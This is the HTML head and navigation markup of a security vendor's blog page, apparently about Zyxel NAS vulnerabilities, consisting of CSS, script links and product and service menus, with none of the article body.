flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='ez-toc-css' href='https://outpost24.com/wp-content/plugins/easy-table-of-contents/assets/css/screen.min.css?ver=2.0.71' type='text/css' media='all' />
<style id='ez-toc-inline-css' type='text/css'>
div#ez-toc-container .ez-toc-title {font-size: 100%;}div#ez-toc-container .ez-toc-title {font-weight: 400;}div#ez-toc-container ul li {font-size: 100%;}div#ez-toc-container ul li {font-weight: 500;}div#ez-toc-container nav ul ul li {font-size: 100%;}div#ez-toc-container {background: #fff;border: 1px solid #ddd;width: 225px;}div#ez-toc-container p.ez-toc-title , #ez-toc-container .ez_toc_custom_title_icon , #ez-toc-container .ez_toc_custom_toc_icon {color: #999;}div#ez-toc-container ul.ez-toc-list a {color: #428bca;}div#ez-toc-container ul.ez-toc-list a:hover {color: #2a6496;}div#ez-toc-container ul.ez-toc-list a:visited {color: #428bca;}
.ez-toc-container-direction {direction: ltr;}.ez-toc-counter ul{counter-reset: item ;}.ez-toc-counter nav ul li a::before {content: counters(item, '.', decimal) '. ';display: inline-block;counter-increment: item;flex-grow: 0;flex-shrink: 0;margin-right: .2em; float: left; }.ez-toc-widget-direction {direction: ltr;}.ez-toc-widget-container ul{counter-reset: item ;}.ez-toc-widget-container nav ul li a::before {content: counters(item, '.', decimal) '. ';display: inline-block;counter-increment: item;flex-grow: 0;flex-shrink: 0;margin-right: .2em; float: left; }
</style>
<link rel='stylesheet' id='megamenu-css' href='https://outpost24.com/wp-content/uploads/maxmegamenu/style.css?ver=607cfc' type='text/css' media='all' />
<link rel='stylesheet' id='outpost24-main-css' href='https://outpost24.com/wp-content/themes/OP24/assets/css/main.css?ver=1736580762' type='text/css' media='all' />
<link rel='stylesheet' id='jquery-lazyloadxt-spinner-css-css' href='//outpost24.com/wp-content/plugins/a3-lazy-load/assets/css/jquery.lazyloadxt.spinner.css?ver=6.7.1' type='text/css' media='all' />
<script type="text/javascript" src="https://outpost24.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://outpost24.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://outpost24.com/wp-content/themes/OP24/assets/js/main.js?ver=1736580762" id="outpost24-bundle-js"></script>
<script type="text/javascript" src="https://outpost24.com/wp-content/themes/OP24/assets/js/yoast-faq.js?ver=6.7.1" id="outpost24-bundle2-js"></script>
<script type="text/javascript" src="https://outpost24.com/wp-content/themes/OP24/assets/js/slick.min.js?ver=6.7.1" id="outpost24-slick-js"></script>
<link rel="https://api.w.org/" href="https://outpost24.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://outpost24.com/wp-json/wp/v2/posts/5971" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://outpost24.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.7.1" />
<link rel='shortlink' href='https://outpost24.com/?p=5971' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://outpost24.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Foutpost24.com%2Fblog%2Fzyxel-nas-critical-vulnerabilities%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://outpost24.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Foutpost24.com%2Fblog%2Fzyxel-nas-critical-vulnerabilities%2F&#038;format=xml" />
<link rel="icon" href="https://outpost24.com/wp-content/uploads/2023/05/cropped-O24_favicon_512_b_a-32x32.png" sizes="32x32" />
<link rel="icon" href="https://outpost24.com/wp-content/uploads/2023/05/cropped-O24_favicon_512_b_a-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://outpost24.com/wp-content/uploads/2023/05/cropped-O24_favicon_512_b_a-180x180.png" />
<meta name="msapplication-TileImage" content="https://outpost24.com/wp-content/uploads/2023/05/cropped-O24_favicon_512_b_a-270x270.png" />
		<style type="text/css" id="wp-custom-css">
			header.header div.site-logo img.custom-logo{
    width: 200px;
}
		</style>
		<style type="text/css">/** Mega Menu CSS: fs **/</style>
</head>
<body class="post-template-default single single-post postid-5971 single-format-standard wp-custom-logo mega-menu-main-menu">
	<header class="header">
		<div class="header-mobile is-hidden--desktop">
			<div class="container">
	<div class="mobile-menu-header">
		<div class="mobile-menu-primary">
			<li class="mobile-menu-search"><form role="search" method="get" class="search-form" action="https://outpost24.com/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></li>
			<div id="mega-menu-wrap-main-menu" class="mega-menu-wrap"><div class="mega-menu-toggle"><div class="mega-toggle-blocks-left"><div class='mega-toggle-block mega-menu-toggle-animated-block mega-toggle-block-1' id='mega-toggle-block-1'><button aria-label="Mobile menu" class="mega-toggle-animated mega-toggle-animated-slider" type="button" aria-expanded="false">
                  <span class="mega-toggle-animated-box">
                    <span class="mega-toggle-animated-inner"></span>
                  </span>
                </button></div></div><div class="mega-toggle-blocks-center"></div><div class="mega-toggle-blocks-right"></div></div><ul id="mega-menu-main-menu" class="mega-menu max-mega-menu mega-menu-horizontal mega-no-js" data-event="hover_intent" data-effect="fade_up" data-effect-speed="200" data-effect-mobile="slide" data-effect-speed-mobile="200" data-mobile-force-width="body" data-second-click="go" data-document-click="collapse" data-vertical-behaviour="accordion" data-breakpoint="1023" data-unbind="true" data-mobile-state="collapse_all" data-mobile-direction="vertical" data-hover-intent-timeout="300" data-hover-intent-interval="100"><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-menu-item-has-children mega-align-bottom-left mega-menu-flyout mega-menu-item-629' id='mega-menu-item-629'><a class="mega-menu-link" href="https://outpost24.com/products/" aria-expanded="false" tabindex="0" aria-label="menu link to Products">Products<span class="mega-indicator"></span></a>
<ul class="mega-sub-menu">
<li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-6039' id='mega-menu-item-6039'><a class="mega-menu-link" href="https://outpost24.com/products/exposure-management-platform/" aria-label="menu link to Exposure Management Platform"><span class="mega-description-group"><span class="mega-menu-title">Exposure Management Platform</span><span class="mega-menu-description">Remediate your organization’s most critical vulnerabilities with our modular platform that offers continuous and comprehensive visibility into your attack surface.</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-3283' id='mega-menu-item-3283'><a class="mega-menu-link" href="https://outpost24.com/products/external-attack-surface-management/" aria-label="menu link to External Attack Surface Management"><span class="mega-description-group"><span class="mega-menu-title">External Attack Surface Management</span><span class="mega-menu-description">Attack surface discovery and monitoring in real-time with actionable insights</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-889' id='mega-menu-item-889'><a class="mega-menu-link" href="https://outpost24.com/products/web-application-security-testing/" aria-label="menu link to Web Application Security Testing"><span class="mega-description-group"><span class="mega-menu-title">Web Application Security Testing</span><span class="mega-menu-description">Manual testing &#038; automated scanning with continuous monitoring via pen testing as a service (PTaaS)</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-887' id='mega-menu-item-887'><a class="mega-menu-link" href="https://outpost24.com/products/cyber-threat-intelligence/" aria-label="menu link to Cyber Threat Intelligence"><span class="mega-description-group"><span class="mega-menu-title">Cyber Threat Intelligence</span><span class="mega-menu-description">Digital risk protection with our modular, multi-tenant, subscription-based solution for any use case</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-888' id='mega-menu-item-888'><a class="mega-menu-link" href="https://outpost24.com/products/risk-based-vulnerability-management/" aria-label="menu link to Risk-based Vulnerability Management"><span class="mega-description-group"><span class="mega-menu-title">Risk-based Vulnerability Management</span><span class="mega-menu-description">Vulnerability management with real-word threat intelligence to focus remediation &#038; reduce business risk</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-5426' id='mega-menu-item-5426'><a class="mega-menu-link" href="https://outpost24.com/products/active-directory-password-security/" aria-label="menu link to Active Directory Password Security"><span class="mega-description-group"><span class="mega-menu-title">Active Directory Password Security</span><span class="mega-menu-description">Strengthen AD passwords with Specops Software, an Outpost24 company</span></span></a></li></ul>
</li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-menu-item-has-children mega-align-bottom-left mega-menu-flyout mega-menu-item-6363' id='mega-menu-item-6363'><a class="mega-menu-link" href="https://outpost24.com/services/managed-services/" aria-expanded="false" tabindex="0" aria-label="menu link to Services">Services<span class="mega-indicator"></span></a>
<ul class="mega-sub-menu">
<li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-6167' id='mega-menu-item-6167'><a class="mega-menu-link" href="https://outpost24.com/services/managed-services/" aria-label="menu link to Managed Services"><span class="mega-description-group"><span class="mega-menu-title">Managed Services</span><span class="mega-menu-description">Proactive security services for your network, endpoints, applications, and clouds</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-890' id='mega-menu-item-890'><a class="mega-menu-link" href="https://outpost24.com/services/penetration-testing/" aria-label="menu link to Penetration Testing"><span class="mega-description-group"><span class="mega-menu-title">Penetration Testing</span><span class="mega-menu-description">Classic penetration testing on networks, web, and mobile applications</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-2356' id='mega-menu-item-2356'><a class="mega-menu-link" href="https://outpost24.com/services/red-teaming/" aria-label="menu link to Red Teaming"><span class="mega-description-group"><span class="mega-menu-title">Red Teaming</span><span class="mega-menu-description">Scenario-based attack simulations to reveal hidden threats</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-2326' id='mega-menu-item-2326'><a class="mega-menu-link" href="https://outpost24.com/services/security-awareness-training/" aria-label="menu link to Security Awareness Training"><span class="mega-description-group"><span class="mega-menu-title">Security Awareness Training</span><span class="mega-menu-description">Complete solution to improve security resilience throughout your organization</span></span></a></li></ul>
</li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-menu-item-has-children mega-align-bottom-left mega-menu-flyout mega-menu-item-21' id='mega-menu-item-21'><a class="mega-menu-link" href="/resources/" aria-expanded="false" tabindex="0" aria-label="menu link to Resources">Resources<span class="mega-indicator"></span></a>
<ul class="mega-sub-menu">
<li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-has-description mega-menu-item-150' id='mega-menu-item-150'><a class="mega-menu-link" href="/resources/#research" aria-label="menu link to Research"><span class="mega-description-group"><span class="mega-menu-title">Research</span><span class="mega-menu-description">In-depth reports compiled by KrakenLabs, our Threat Intelligence analysts</span></span></a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-has-description mega-menu-item-149' id='mega-menu-item-149'><a class="mega-menu-link" href="/resources/#datasheets" aria-label="menu link to Datasheets"><span class="mega-description-group"><span class="mega-menu-title">Datasheets</span><span class="mega-menu-description">Downloadable datasheets for products and services</span></span></a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-has-description mega-menu-item-151' id='mega-menu-item-151'><a class="mega-menu-link" href="/resources/#webinar" aria-label="menu link to Videos &amp; Webinars"><span class="mega-description-group"><span class="mega-menu-title">Videos & Webinars</span><span class="mega-menu-description">On-demand webinars and product videos</span></span></a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-has-description mega-menu-item-2913' id='mega-menu-item-2913'><a class="mega-menu-link" href="/resources/#whitepaper" aria-label="menu link to Whitepapers"><span class="mega-description-group"><span class="mega-menu-title">Whitepapers</span><span class="mega-menu-description">Industry and best practice guides for securing your business</span></span></a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-has-description mega-menu-item-5322' id='mega-menu-item-5322'><a class="mega-menu-link" href="/resources/#event" aria-label="menu link to Upcoming Events"><span class="mega-description-group"><span class="mega-menu-title">Upcoming Events</span><span class="mega-menu-description">Cybersecurity conferences, events, and webinars organized by Outpost24</span></span></a></li></ul>
</li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-align-bottom-left mega-menu-flyout mega-menu-item-630' id='mega-menu-item-630'><a class="mega-menu-link" href="https://outpost24.com/support/" tabindex="0" aria-label="menu link to Support">Support</a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-align-bottom-left mega-menu-flyout mega-menu-item-5923' id='mega-menu-item-5923'><a class="mega-menu-link" href="https://outpost24.com/partners/" tabindex="0" aria-label="menu link to Partners">Partners</a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-menu-item-has-children mega-align-bottom-left mega-menu-flyout mega-menu-item-2335' id='mega-menu-item-2335'><a class="mega-menu-link" href="https://outpost24.com/company/" aria-expanded="false" tabindex="0" aria-label="menu link to Company">Company<span class="mega-indicator"></span></a>
<ul class="mega-sub-menu">
<li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-2515' id='mega-menu-item-2515'><a class="mega-menu-link" href="https://outpost24.com/company/" aria-label="menu link to Company Overview"><span class="mega-description-group"><span class="mega-menu-title">Company Overview</span><span class="mega-menu-description">Our mission to fight cybercrime, and who we are</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-5857' id='mega-menu-item-5857'><a class="mega-menu-link" href="https://outpost24.com/news/" aria-label="menu link to Newsroom"><span class="mega-description-group"><span class="mega-menu-title">Newsroom</span><span class="mega-menu-description">Our latest announcements, press mentions, and media contact information.</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-2336' id='mega-menu-item-2336'><a class="mega-menu-link" href="https://outpost24.com/certifications/" aria-label="menu link to Certifications"><span class="mega-description-group"><span class="mega-menu-title">Certifications</span><span class="mega-menu-description">Cybersecurity certifications and adherence to industry best practice standards</span></span></a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-has-description mega-menu-item-157' id='mega-menu-item-157'><a class="mega-menu-link" href="/customers/" aria-label="menu link to Customers"><span class="mega-description-group"><span class="mega-menu-title">Customers</span><span class="mega-menu-description">Real-world examples of how Outpost24 helps businesses improve their security posture</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-2589' id='mega-menu-item-2589'><a class="mega-menu-link" href="https://outpost24.com/esg/" aria-label="menu link to ESG"><span class="mega-description-group"><span class="mega-menu-title">ESG</span><span class="mega-menu-description">Our principles and commitments as a global citizen</span></span></a></li><li class='mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-has-description mega-menu-item-159' id='mega-menu-item-159'><a class="mega-menu-link" href="https://careers.outpost24.com/#jobs" aria-label="menu link to Careers"><span class="mega-description-group"><span class="mega-menu-title">Careers</span><span class="mega-menu-description">We’re hiring! Check out our current openings</span></span></a></li></ul>
</li><li class='mega-is-hidden--desktop mega-menu-item mega-menu-item-type-custom mega-menu-item-object-custom mega-align-bottom-left mega-menu-flyout mega-menu-item-6270 is-hidden--desktop' id='mega-menu-item-6270'><a class="mega-menu-link" href="https://careers.outpost24.com/#jobs" tabindex="0" aria-label="menu link to Careers">Careers</a></li><li class='mega-is-hidden--desktop mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-current_page_parent mega-align-bottom-left mega-menu-flyout mega-menu-item-6271 is-hidden--desktop' id='mega-menu-item-6271'><a class="mega-menu-link" href="https://outpost24.com/blog/" tabindex="0" aria-label="menu link to Blog">Blog</a></li><li class='mega-is-hidden--desktop mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-align-bottom-left mega-menu-flyout mega-menu-item-6272 is-hidden--desktop' id='mega-menu-item-6272'><a class="mega-menu-link" href="https://outpost24.com/pricing/" tabindex="0" aria-label="menu link to Pricing">Pricing</a></li><li class='mega-is-hidden--desktop mega-primary-button mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-align-bottom-left mega-menu-flyout mega-menu-item-6273 is-hidden--desktop primary-button' id='mega-menu-item-6273'><a class="mega-menu-link" href="https://outpost24.com/contact/" tabindex="0" aria-label="menu link to Contact">Contact</a></li></ul></div>			<li class="translate-container-mbl">
				<div class="translate-icon">
					<select class="lang-selector" aria-label="Select Language">
						<option hidden></option><option selected="selected" value=".">English</option><option value="/de">Deutsch</option><option value="/fr">Français</option>					</select>
				</div>
			</li>
		</div>
		<div class="mobile-header-logo">
							<div class="site-logo"><a href="https://outpost24.com/" class="custom-logo-link" rel="home"><img width="1" height="1" src="https://outpost24.com/wp-content/uploads/2023/05/01-o24-color.svg" class="custom-logo" alt="outpost24 logo" decoding="async" /></a></div>
					</div>
	</div>
</div>
		</div>
		<div class="header-desktop is-hidden--mobile">
			<div class="header-top">
	<div class="container">
		<div class="header-top-items">
			<div class="menu-header-top-container"><ul id="menu-header-top" class="menu"><li id="menu-item-3795" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3795"><a href="https://careers.outpost24.com/" aria-label="menu link to Careers">Careers</a></li>
<li id="menu-item-5921" class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-5921"><a href="https://outpost24.com/blog/" aria-label="menu link to Blog">Blog</a></li>
<li id="menu-item-627" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-627"><a href="https://outpost24.com/pricing/" aria-label="menu link to Pricing">Pricing</a></li>
<li id="menu-item-1057" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1057"><a href="https://outpost24.com/contact/" aria-label="menu link to Contact">Contact</a></li>
</ul></div>			<div class="menu-top-search">
				<span class="search-icon"></span>
				<div class="search-form"><form role="search" method="get" class="search-form" action="https://outpost24.com/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></div>
			</div>
			<div class="translate-container">
				<div class="translate-icon">
					<select id="lang-selector" aria-label="Select Language">
						<option hidden></option><option selected="selected" value=".">English</option><option value="/de">Deutsch</option><option value="/fr">Français</option>    
					</select>
				</div>
			</div>
		</div>
	</div>
</div>
<div class="container">
	<div class="header-bottom">
		<div class="header-logo">
							<div class="site-logo"><a href="https://outpost24.com/" class="custom-logo-link" rel="home"><img width="1" height="1" src="https://outpost24.com/wp-content/uploads/2023/05/01-o24-color.svg" class="custom-logo" alt="outpost24 logo" decoding="async" /></a></div>
					</div>
		<div class="header-menu">
			<div id="mega-menu-wrap-main-menu" class="mega-menu-wrap"><div class="mega-menu-toggle"><div class="mega-toggle-blocks-left"><div class='mega-toggle-block mega-menu-toggle-animated-block mega-toggle-block-1' id='mega-toggle-block-1'><button aria-label="Mobile menu" class="mega-toggle-animated mega-toggle-animated-slider" type="button" aria-expanded="false">
                  <span class="mega-toggle-animated-box">
                    <span class="mega-toggle-animated-inner"></span>
                  </span>
                </button></div></div><div class="mega-toggle-blocks-center"></div><div class="mega-toggle-blocks-right"></div></div><ul id="mega-menu-main-menu" class="mega-menu max-mega-menu mega-menu-horizontal mega-no-js" data-event="hover_intent" data-effect="fade_up" data-effect-speed="200" data-effect-mobile="slide" data-effect-speed-mobile="200" data-mobile-force-width="body" data-second-click="go" data-document-click="collapse" data-vertical-behaviour="accordion" data-breakpoint="1023" data-unbind="true" data-mobile-state="collapse_all" data-mobile-direction="vertical" data-hover-intent-timeout="300" data-hover-intent-interval="100"><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-menu-item-has-children mega-align-bottom-left mega-menu-flyout mega-menu-item-629' id='mega-menu-item-629'><a class="mega-menu-link" href="https://outpost24.com/products/" aria-expanded="false" tabindex="0" aria-label="menu link to Products">Products<span class="mega-indicator"></span></a>
<ul class="mega-sub-menu">
<li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-6039' id='mega-menu-item-6039'><a class="mega-menu-link" href="https://outpost24.com/products/exposure-management-platform/" aria-label="menu link to Exposure Management Platform"><span class="mega-description-group"><span class="mega-menu-title">Exposure Management Platform</span><span class="mega-menu-description">Remediate your organization’s most critical vulnerabilities with our modular platform that offers continuous and comprehensive visibility into your attack surface.</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-3283' id='mega-menu-item-3283'><a class="mega-menu-link" href="https://outpost24.com/products/external-attack-surface-management/" aria-label="menu link to External Attack Surface Management"><span class="mega-description-group"><span class="mega-menu-title">External Attack Surface Management</span><span class="mega-menu-description">Attack surface discovery and monitoring in real-time with actionable insights</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-889' id='mega-menu-item-889'><a class="mega-menu-link" href="https://outpost24.com/products/web-application-security-testing/" aria-label="menu link to Web Application Security Testing"><span class="mega-description-group"><span class="mega-menu-title">Web Application Security Testing</span><span class="mega-menu-description">Manual testing &#038; automated scanning with continuous monitoring via pen testing as a service (PTaaS)</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-887' id='mega-menu-item-887'><a class="mega-menu-link" href="https://outpost24.com/products/cyber-threat-intelligence/" aria-label="menu link to Cyber Threat Intelligence"><span class="mega-description-group"><span class="mega-menu-title">Cyber Threat Intelligence</span><span class="mega-menu-description">Digital risk protection with our modular, multi-tenant, subscription-based solution for any use case</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-888' id='mega-menu-item-888'><a class="mega-menu-link" href="https://outpost24.com/products/risk-based-vulnerability-management/" aria-label="menu link to Risk-based Vulnerability Management"><span class="mega-description-group"><span class="mega-menu-title">Risk-based Vulnerability Management</span><span class="mega-menu-description">Vulnerability management with real-word threat intelligence to focus remediation &#038; reduce business risk</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-5426' id='mega-menu-item-5426'><a class="mega-menu-link" href="https://outpost24.com/products/active-directory-password-security/" aria-label="menu link to Active Directory Password Security"><span class="mega-description-group"><span class="mega-menu-title">Active Directory Password Security</span><span class="mega-menu-description">Strengthen AD passwords with Specops Software, an Outpost24 company</span></span></a></li></ul>
</li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-menu-item-has-children mega-align-bottom-left mega-menu-flyout mega-menu-item-6363' id='mega-menu-item-6363'><a class="mega-menu-link" href="https://outpost24.com/services/managed-services/" aria-expanded="false" tabindex="0" aria-label="menu link to Services">Services<span class="mega-indicator"></span></a>
<ul class="mega-sub-menu">
<li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-6167' id='mega-menu-item-6167'><a class="mega-menu-link" href="https://outpost24.com/services/managed-services/" aria-label="menu link to Managed Services"><span class="mega-description-group"><span class="mega-menu-title">Managed Services</span><span class="mega-menu-description">Proactive security services for your network, endpoints, applications, and clouds</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-890' id='mega-menu-item-890'><a class="mega-menu-link" href="https://outpost24.com/services/penetration-testing/" aria-label="menu link to Penetration Testing"><span class="mega-description-group"><span class="mega-menu-title">Penetration Testing</span><span class="mega-menu-description">Classic penetration testing on networks, web, and mobile applications</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-2356' id='mega-menu-item-2356'><a class="mega-menu-link" href="https://outpost24.com/services/red-teaming/" aria-label="menu link to Red Teaming"><span class="mega-description-group"><span class="mega-menu-title">Red Teaming</span><span class="mega-menu-description">Scenario-based attack simulations to reveal hidden threats</span></span></a></li><li class='mega-menu-item mega-menu-item-type-post_type mega-menu-item-object-page mega-has-description mega-menu-item-2326' id='mega-menu-item-2326'><a class="mega-menu-link" href="https://outpost24.com/services/security-awareness-training/" aria-label="menu link to Security Awareness Training"><span class="mega-description-group"><span class="mega-menu-title">Security Awareness Training</span><span class="mega-menu-description">Complete solution to improve security resilience throughout your organization</span></span></a></li></ul>
